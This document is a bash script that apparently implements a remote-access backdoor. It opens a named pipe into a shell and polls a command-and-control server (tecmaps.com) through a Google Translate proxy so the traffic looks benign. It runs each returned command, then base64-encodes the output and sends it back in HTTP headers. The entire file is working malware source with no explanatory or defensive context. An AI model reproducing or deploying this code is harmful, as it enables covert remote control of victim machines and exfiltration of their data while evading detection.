#!/bin/bash

running=true
secretkey="b4bysh4rk"
user_agent="User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"
data="Content-Hype: "
c2server="tecmaps.com/momyshark?key=$secretkey"
result=""
input="/tmp/input"
output="/tmp/output"

function namedpipe(){
  rm "$input" "$output"
  mkfifo "$input"
  tail -f "$input" | /bin/bash 2>&1 > $output &
}

function getfirsturl(){
  url="https://translate.google.com/translate?&anno=2&u=$c2server"
  second=$( curl --silent "$url" -L -H "$user_agent" | xmllint --html --xpath '/html/body/script/@data-proxy-full-url' - 2>/dev/null | cut -d "=" -f2- | tr -d '"' | sed 's/amp;//g' )
} 

#function getsecondurl(){
#  second=$(curl --silent "$first" -L -H "$user_agent"  | xmllint --html --xpath '//a/@href' - 2>/dev/null | cut -d "=" -f2- | tr -d '"' | sed 's/amp;//g')
#}

function getcommand(){
  if [[ "$result" ]];then  
    command=$(curl -L --silent $second -H "$result" )
  else
    command=$(curl -L --silent $second -H "$user_agent" )

    command1=$(echo "$command" | xmllint --html --xpath '//span[@class="google-src-text"]/text()' - 2>/dev/null)
    command2=$(echo "$command" | xmllint --html --xpath '/html/body/main/div/div/div/div/ul/li/span/text()' - 2>/dev/null )
    if [[ "$command1" ]];then
      command="$command1"
    else
      command="$command2"
    fi
  fi
}

function talktotranslate(){
  getfirsturl
#  getsecondurl
  getcommand
}

function main(){
  result=""
  sleep 10
  talktotranslate
  if [[ "$command" ]];then
	onlycommand=$(echo $command | cut -f1 -d '#')
    if [[ $onlycommand == "exit " ]];then
      running=false 
    fi
    echo $onlycommand
    echo -n > $output
    idcommand=$(echo $command | cut -d '#' -f2)
    echo $onlycommand > $input
    sleep 2
    outputb64=$(cat $output | tr -d '\000'  | base64 | tr -d '\n'  2>/dev/null)
	echo $outputb64
    if [[ "$outputb64" ]];then
      result="$user_agent | $outputb64 | $idcommand "
      talktotranslate
    fi
  fi
}

namedpipe
while "$running";do
  main
done
